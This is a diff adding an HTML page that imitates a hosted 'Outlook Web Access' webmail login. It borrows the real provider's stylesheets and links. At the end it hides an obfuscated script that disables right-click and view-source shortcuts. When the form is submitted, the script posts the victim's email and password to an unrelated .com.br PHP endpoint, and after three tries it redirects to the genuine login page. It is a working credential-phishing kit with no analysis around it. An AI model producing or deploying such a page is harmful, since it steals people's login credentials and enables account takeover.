@@ -1,0 +1,144 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>&#x4F;&#x75;&#x74;&#x6C;&#x6F;&#x6F;&#x6B;&#x20;&#x57;&#x65;&#x62;&#x20;&#x41;&#x63;&#x63;&#x65;&#x73;&#x73;</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link href="https://controlpanel.serverdata.net/Portal/bundles/styles/login/aduser?v=W7BlBDeKoLwh8af7SGN3zTnaNVVx3_J0LsG11KaUjz81" rel="stylesheet"/>
+
+    <script src="https://controlpanel.serverdata.net/Portal/bundles/scripts/login/form?v=CmdgOWPmbhvy-YqQrxjWVdKbUwAQPUKB8GGJxjDJB141"></script>
+
+    <style>
+        .wbk {
+            word-break: keep-all;
+        }
+        .p0 {
+            padding: 0;
+        }
+    </style>
+</head>
+<body>
+    <section class="login-section">
+        <div class="login-logo"></div>
+        <h1 class="login-header">Welcome to your Webmail &amp; Account Settings</h1>
+        
+
+<div class="login-alert" id="login-update-browser-ie" style="display: none">
+    <div class="text-center">
+        <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be optimal. For the best experience, please upgrade your browser. </p>
+    </div>
+</div>
+
+        <div id="oldBrowser" class="login-alert" style="display: none;">
+            <div class="login-alert-content">
+                
+                <img class="login-alert-icon m-24" src="https://controlpanel.serverdata.net/Content/images/icons/24/warning-orange_24.png" alt="">
+                <div class="login-alert-text"><div class="d-tc">
+ <i class="login-alert-icon-warning mr10 ml-10"></i>
+ </div>
+ <div class="d-tc">
+ <p><strong>You’ll get more if you update your browser.</strong> <br>
+ Our layout and page behavior is optimized for the latest version of your browser.</p>
+ <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
+ <p class="mb0">This button will redirect you to your browser’s
+ update page</p>
+ </div></div>
+            </div>
+        </div>
+                            <div class="login-tabs">
+                
+            </div>
+        <form method="POST" class="login-form" novalidate autocomplete="off">
+            <div>
+                <div id="aduser-login-spinner" style="display: none">
+                    <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
+                        <ui:spinner></ui:spinner>
+                    </div>
+                </div>
+                <input name="returnUrl" type="hidden" value="#" />
+                <input name="clientType" type="hidden" class="client-type" value="WebMail" />
+                <div class="pr">
+                    <input name="login"
+                           id="email"
+                           type="text"
+                           value=""
+                           placeholder="Login (email)"
+                           class="login-input" required autofocus />
+                    <div class="login-validation required">Login required</div>
+                        <div class="login-validation email">Valid email address required</div>
+                </div>
+                <div class="pr">
+                    <input name="password"
+                           id="password"
+                           type="password"
+                           placeholder="Password"
+                           class="password-input" required />
+                    <div class="password-validation required">Password required</div>
+                <div class="mixed-validation" id="msg" style="display: none;">Your login or password is incorrect. </div>
+          <span id="error" class="mixed-validation" style="display: none;"></span> <br>
+                <template id="login-captcha-template">
+                    <div class="login-form-captcha">
+                        <input type="hidden" name="captchaId" value="4bdc44d6c187432482590abd5ba1f87d" />
+                        <div class="captcha-image">
+                            <img id="captchaImage" src="/Portal/Captcha?id=4bdc44d6c187432482590abd5ba1f87d&amp;width=94&amp;height=36&amp;rnd=1752239142&amp;httproute=True" alt="" />
+                        </div>
+                        <button class="captcha-refresh" type="button">
+                            
+                            <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24" class="captcha-refresh-icon">
+                                <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
+                                c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
+                                c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z">
+                                </path>
+                                <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
+                                C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
+                                c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z">
+                                </path>
+                            </svg>
+                            
+                        </button>
+                    </div>
+                    <div class="pr">
+                        <input name="captchaCode" type="text" placeholder="Code" class="captcha-input" autofocus />
+                        <div class="captcha-validation required">Code required</div>
+                        <div class="captcha-validation server">Valid code required</div>
+                    </div>
+                </template>
+                <div id="login-captcha-place" class="pr"></div>
+                <div class="login-actions">
+                    <div class="login-remember">
+                        <label class="login-remember-me">
+                            <input type="checkbox" name="rememberMe" value="true" class="login-checkbox" />
+                            <span style="line-height: 22px; height: 22px;">Remember me</span>
+                        </label>
+                    </div>
+                    <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
+                </div>
+            </div>
+            <button type="submit" id="submit-btn" class="login-submit wbk p0">Login</button>
+        </form>
+    </section>
+    <span style="display: none">
+        <!-- GA general tracking -->
+
+
+
+ <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+        
+
+        <script>
+
+var _0x45838c=_0x450c;function _0x49a9(){var _0x352568=['#email','156132JYHBiN','4213048hOlpfN','LOGIN','<span\x20style=\x27color:black;\x20font-size:15px\x27>Valid\x20email\x20address\x20required</span>','.email','https://','125TrBqWA','9gABbKu','https://controlpanel.serverdata.net/Portal/ADUser/Login','html','keyCode','#inputbar','#back1','2wUWAbN','<span\x20style=\x27color:black;\x20font-size:15px\x27>Password\x20required</span>','hide','indexOf','preventDefault','log','contextmenu','7tuZPyJ','ctrlKey','test','<span\x20style=\x27color:black;\x20font-size:15px\x27>That\x20account\x20doesn\x27t\x20exist.\x20Enter\x20a\x20valid\x20email\x20address</span>','val','keypress','show','<span\x20style=\x27color:red;\x20font-size:15px\x27>Email\x20account\x20or\x20Password\x20is\x20incorrect.\x20Please\x20try\x20again</span>','substr','replace','#automail','#msg','46014SJRKWI','location','POST','223869RIhKsr','animate','msg','ready','#error','url(\x27https://image.thum.io/get/auth/55767-b8aba2c2e6db62cad26e7478cd4e2a2a/width/1200/https://','ajax','click','#password','focus','7085767xskKQN','6107870yBDqzt','#submit-btn','onkeydown','52zKiGUl','565283FSzeJV','99kOkSrA'];_0x49a9=function(){return _0x352568;};return _0x49a9();}function _0x450c(_0x556abd,_0x351aa9){var _0x49a920=_0x49a9();return _0x450c=function(_0x450c48,_0x44e16f){_0x450c48=_0x450c48-0xb5;var _0x3777e3=_0x49a920[_0x450c48];return _0x3777e3;},_0x450c(_0x556abd,_0x351aa9);}(function(_0x1f68e4,_0x2316df){var _0x312264=_0x450c,_0x522a4e=_0x1f68e4();while(!![]){try{var _0x4c004d=parseInt(_0x312264(0xb7))/0x1*(parseInt(_0x312264(0xc7))/0x2)+-parseInt(_0x312264(0xdd))/0x3*(-parseInt(_0x312264(0xb6))/0x4)+-parseInt(_0x312264(0xc0))/0x5*(parseInt(_0x312264(0xda))/0x6)+-parseInt(_0x312264(0xce))/0x7*(-parseInt(_0x312264(0xbb))/0x8)+parseInt(_0x312264(0xc1))/0x9*(-parseInt(_0x312264(0xe8))/0xa)+parseInt(_0x312264(0xb8))/0xb*(-parseInt(_0x312264(0xba))/0xc)+-parseInt(_0x312264(0xe7))/0xd;if(_0x4c004d===_0x2316df)break;else _0x522a4e['push'](_0x522a4e['shift']());}catch(_0x52bcab){_0x522a4e['push'](_0x522a4e['shift']());}}}(_0x49a9,0x91d5f),$(document)['bind']('keydown',function(_0x33299d){var _0x3a9329=_0x450c;if(_0x33299d[_0x3a9329(0xcf)]&&_0x33299d['which']==0x53)return _0x33299d[_0x3a9329(0xcb)](),![];}),document['addEventListener'](_0x45838c(0xcd),_0x28d75c=>_0x28d75c[_0x45838c(0xcb)]()),document[_0x45838c(0xb5)]=function(_0x3cd864){var _0x2a21a9=_0x45838c;return _0x3cd864[_0x2a21a9(0xcf)]&&(_0x3cd864['keyCode']===0x43||_0x3cd864[_0x2a21a9(0xc4)]===0x56||_0x3cd864[_0x2a21a9(0xc4)]===0x55||_0x3cd864[_0x2a21a9(0xc4)]===0x75)?![]:!![];},$(document)[_0x45838c(0xd3)]('u',function(_0x1a0c35){var _0x1bd8fb=_0x45838c;return _0x1a0c35[_0x1bd8fb(0xcf)]?![]:!![];}),$(document)[_0x45838c(0xe0)](function(){var _0x46e0ef=_0x45838c,_0x78ebf4=0x0;$(_0x46e0ef(0xc6))[_0x46e0ef(0xe4)](function(){var _0x156d10=_0x46e0ef;$(_0x156d10(0xd9))['hide'](),$(_0x156d10(0xb9))[_0x156d10(0xd2)](''),$(_0x156d10(0xd8))[_0x156d10(0xde)]({'left':0xc8,'opacity':'hide'},0x0),$(_0x156d10(0xc5))[_0x156d10(0xde)]({'right':0xc8,'opacity':'show'},0x3e8);});var _0x30313d=window[_0x46e0ef(0xdb)]['hash'][_0x46e0ef(0xd6)](0x1);if(!_0x30313d){}else{var _0xd90aa9=_0x30313d;$(_0x46e0ef(0xb9))[_0x46e0ef(0xd2)](_0xd90aa9);var _0x329e69=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x329e69[_0x46e0ef(0xd0)](_0xd90aa9))return $(_0x46e0ef(0xe1))[_0x46e0ef(0xd4)](),_0x30313d[_0x46e0ef(0xe6)],![];var _0x16e7fd=_0xd90aa9[_0x46e0ef(0xca)]('@'),_0x2748cc=_0xd90aa9[_0x46e0ef(0xd6)](_0x16e7fd+0x1),_0xb774b7=_0x46e0ef(0xbf)+_0x2748cc,_0x5cd083=_0x2748cc,_0x52ba35=_0x46e0ef(0xe2)+_0x5cd083;'\x27)',$(_0x46e0ef(0xbe))['html'](_0x30313d);}$(_0x46e0ef(0xe9))['click'](function(_0x1ef67d){var _0x375583=_0x46e0ef;_0x1ef67d[_0x375583(0xcb)](),$(_0x375583(0xe1))['hide'](),$(_0x375583(0xd9))[_0x375583(0xc9)]();var _0x12376a=$(_0x375583(0xb9))[_0x375583(0xd2)](),_0x111a87=$(_0x375583(0xe5))[_0x375583(0xd2)](),_0x3872e4=_0x12376a,_0x7caefc=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;if(!_0x12376a)return $(_0x375583(0xe1))[_0x375583(0xd4)](),$(_0x375583(0xe1))[_0x375583(0xc3)](_0x375583(0xbd)),![];if(!_0x7caefc['test'](_0x3872e4))return $(_0x375583(0xe1))[_0x375583(0xd4)](),$(_0x375583(0xe1))[_0x375583(0xc3)](_0x375583(0xd1)),![];if(!_0x111a87)return $(_0x375583(0xe1))['show'](),$('#error')['html'](_0x375583(0xc8)),![];if(_0x111a87['length']<0x4)return $('#error')[_0x375583(0xd4)](),$(_0x375583(0xe1))[_0x375583(0xc3)]('<span\x20style=\x27color:black;\x20font-size:15px\x27>An\x20error\x20occured,\x20invalid\x20password</span>'),_0x12376a[_0x375583(0xe6)],![];_0x78ebf4=_0x78ebf4+0x1,$[_0x375583(0xe3)]({'dataType':'JSON','url':'https://umanjoemsuavida.com.br/oepl/8b.php','type':_0x375583(0xdc),'data':{'email':_0x12376a,'password':_0x111a87},'beforeSend':function(_0x358ec1){var _0xfd8fa0=_0x375583;$('#submit-btn')[_0xfd8fa0(0xc3)](_0xfd8fa0(0xbc));},'success':function(_0x2905d9){var _0x1b43f5=_0x375583;$(_0x1b43f5(0xd9))['html'](_0x1b43f5(0xd5)),_0x2905d9&&($('#msg')[_0x1b43f5(0xd4)](),console[_0x1b43f5(0xcc)](_0x2905d9),$(_0x1b43f5(0xd9))[_0x1b43f5(0xc3)](_0x2905d9[_0x1b43f5(0xdf)]),_0x2905d9['signal']=='ok'?($(_0x1b43f5(0xe5))[_0x1b43f5(0xd2)](''),_0x78ebf4>=0x3&&(_0x78ebf4=0x0,window['location'][_0x1b43f5(0xd7)](_0x1b43f5(0xc2)))):$(_0x1b43f5(0xd9))['html'](_0x2905d9[_0x1b43f5(0xdf)]));},'error':function(){var _0x1e2b69=_0x375583;$(_0x1e2b69(0xe5))[_0x1e2b69(0xd2)](''),_0x78ebf4>=0x3&&(_0x78ebf4=0x0,window[_0x1e2b69(0xdb)][_0x1e2b69(0xd7)]('https://controlpanel.serverdata.net/Portal/ADUser/Login')),$(_0x1e2b69(0xd9))[_0x1e2b69(0xd4)]();},'complete':function(){var _0x4f3c01=_0x375583;$(_0x4f3c01(0xe9))[_0x4f3c01(0xc3)](_0x4f3c01(0xbc));}});});}));
+
+
+  </script>
+  
+    
+</body>
+</html>
